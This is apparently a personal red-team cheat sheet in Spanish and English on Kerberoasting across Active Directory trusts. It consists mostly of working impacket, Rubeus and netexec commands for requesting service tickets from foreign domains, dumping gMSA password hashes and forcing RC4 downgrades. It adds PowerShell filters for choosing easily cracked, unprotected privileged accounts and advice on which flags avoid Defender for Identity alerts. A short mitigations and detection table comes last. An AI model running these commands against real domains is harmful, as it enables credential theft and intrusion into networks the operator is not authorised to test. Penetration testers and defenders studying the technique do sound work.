---
aliases:
  - Cross-Trust Kerberoast
  - Cross-Forest Kerberoast
  - gMSA Kerberoast
  - Protected Users Kerberoast
tags:
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Kerberoasting]]"
  - "[[AD - Domain & Forest Trusts]]"
---
# Kerberoasting - Cross-Trust & Modern

---

## Cross-Domain Kerberoast (Intra-Forest)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs -target-domain partner.com corp.local/u:p -dc-ip <DC-A> -request` | Roast SPNs en foreign domain | Cross-trust intra-forest. |
| `Rubeus.exe kerberoast /domain:partner.com /outfile:cross.hash` | Cross-domain via Rubeus | Standard. |
| `nxc ldap <foreign-DC> -u 'corp\u' -p pass --kerberoasting cross.hash` | netexec cross-trust | Quick. |
| `setspn -T partner.com -Q */*` | Cross-domain SPN enum native | Discovery. |
^kerb-cross-intra

**Requisito:** trust outbound o bidirectional. Tu user del local domain puede solicitar TGS a SPNs del foreign domain via referral chain.

```bash
# Pipeline cross-trust intra-forest
impacket-GetUserSPNs -target-domain partner.com corp.local/auditor:'Pass!' \
  -dc-ip <DC-corp> -request -outputfile partner_roast.hash
```

---

## Cross-Forest Kerberoast

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| Same `impacket-GetUserSPNs -target-domain` | Funciona si trust forest existe | Cross-forest. |
| Referral chain via local DC | DC local resuelve via trust | Auto. |
| `Get-ADTrust` | Pre-check: trust direction + auth | Pre-attack. |
^kerb-cross-forest

**Caveat:** modern forest trusts pueden tener Selective Auth → solo principals con `Allowed-To-Authenticate` ACE pueden auth a foreign SPNs. Roast falla si no autorizado.

---

## gMSA NO es Kerberoasteable

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Password gMSA | 240 chars random auto-generated | NO crackeable computacionalmente. |
| TGS hash gMSA capturable | Sí, pero password no crackeable | Skip. |
| Alt: leer pwd directo via `msDS-ManagedPassword` | Si tenés ACE en `msDS-GroupMSAMembership` | Direct hash extract. |
^kerb-cross-gmsa

**Realidad:** gMSA accounts tienen SPN pero son **inútiles** para kerberoast. Password 240 chars random = HashCat/John infeasible. Path correcto = lectura pwd directa via gMSADumper si tenés permission.

```bash
# En lugar de roast gMSA, dump pwd directo
nxc ldap <DC> -u user -p pass --gmsa
# Output: NT hash + AES keys directo
```

---

## Computer Accounts

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Password computer account | 128 chars random auto-rotated cada 30d | NO crackeable. |
| Computer SPNs (`HOST/`, `RestrictedKrbHost/`, etc) | Sí tienen SPNs | Skip kerberoast. |
| Excepción: computers creados por atacante (RBCD) | Tienen passwords humanas | Crackeables. |
^kerb-cross-computer

**Filter LDAP correcto:** `(&(objectCategory=user)(servicePrincipalName=*))` excluye `objectCategory=computer`. Standard impacket-GetUserSPNs ya filtra automáticamente.

---

## Protected Users Group Impact

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Members | TGT lifetime 4h, no NTLM, no DES/RC4 (AES required) | Hardening. |
| Kerberoast vs Protected Users | TGS solo AES (etype 17/18) → harder crack | Mitigation. |
| Cross-correlate priv | `Get-ADGroupMember "Protected Users" -Recursive` | Audit. |
^kerb-cross-protected

```powershell
# Identify priv kerberoastable NO en Protected Users
$Protected = (Get-ADGroupMember "Protected Users" -Recursive -EA SilentlyContinue).SamAccountName

Get-ADUser -Filter {ServicePrincipalName -like "*" -and AdminCount -eq 1} -Properties ServicePrincipalName |
  Where { $_.SamAccountName -notin $Protected } |
  Select Name,SamAccountName,@{n='SPNs';e={$_.ServicePrincipalName -join ';'}}
```

---

## msDS-SupportedEncryptionTypes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr msDS-SupportedEncryptionTypes` | Encryption types support | Pre-attack filter. |
| Bit `0x4` (RC4) | RC4-HMAC support | Faster crack. |
| Bit `0x8` (AES128) | AES128 support | Slower crack. |
| Bit `0x10` (AES256) | AES256 support | Slowest crack. |
| Sin attribute set | Default = RC4 + AES (legacy compat) | Standard. |
^kerb-cross-enctypes

```powershell
# Filter accounts soportando RC4 (target faster crack)
Get-ADUser -Filter {ServicePrincipalName -like "*"} \
  -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes |
  Where {
    -not $_.'msDS-SupportedEncryptionTypes' -or
    ($_.'msDS-SupportedEncryptionTypes' -band 0x4)
  } |
  Select Name,SamAccountName,@{n='EncTypes';e={'0x{0:X}' -f $_.'msDS-SupportedEncryptionTypes'}}
```

---

## RC4 Downgrade Attack (Rubeus tgtdeleg)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt` | Force RC4 via TGT delegation flag | Downgrade (loud). |
| `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt` | Solo accounts con RC4 enabled (no force) | Stealth. |
^kerb-cross-downgrade

**Cómo funciona `/tgtdeleg`:** Rubeus solicita TGS con flag indicando soporte solo RC4. KDC complies si account permite RC4. Genera log Event 4769 con etype anomaly = MDI alerta.

**Recomendación:** `/rc4opsec` filter-only sin force. `/tgtdeleg` solo si crack offline crítico y aceptás detection.

---

## Cross-Trust Tooling

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs -target-domain partner.com corp.local/u:p ...` | Linux cross-domain | Standard. |
| `Rubeus.exe kerberoast /domain:partner.com` | Windows cross-domain | Standard. |
| `nxc ldap <foreign-DC> -u 'corp\u' -p pass --kerberoasting cross.hash` | netexec cross-trust | Quick. |
| `setspn -T partner.com -Q */*` | Native enum cross-domain | Discovery. |
^kerb-cross-tools

---

## Mitigations

| **Comando / Setting** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| Service account passwords ≥30 chars random | Crack infeasible | Hardening. |
| Migrate service accounts a gMSA | 240 chars + auto-rotate | Modern. |
| Add Tier 0 service accounts a `Protected Users` | AES-only + 4h TGT | Hardening. |
| Disable RC4 (`Network security: Configure encryption types allowed for Kerberos`) | Force AES-only | Aggressive. |
| Per-account `msDS-SupportedEncryptionTypes = 0x18` (AES only) | AES-only per-account | Granular. |
| Honeypot SPN accounts con monitoring | Trip atacantes | Defender side. |
| Detection: Event 4769 con etype 23 (RC4) en domain default-AES | Anomaly | SIEM rule. |
| MDI alert `Suspected Kerberoasting` | Bulk TGS pattern | Modern detection. |
^kerb-cross-mitigations

```cmd
:: Defender side — disable RC4 per-account (Tier 0)
Set-ADUser <svc-account> -Replace @{"msDS-SupportedEncryptionTypes"=0x18}
:: 0x18 = AES128 (0x8) + AES256 (0x10), sin RC4
```

---
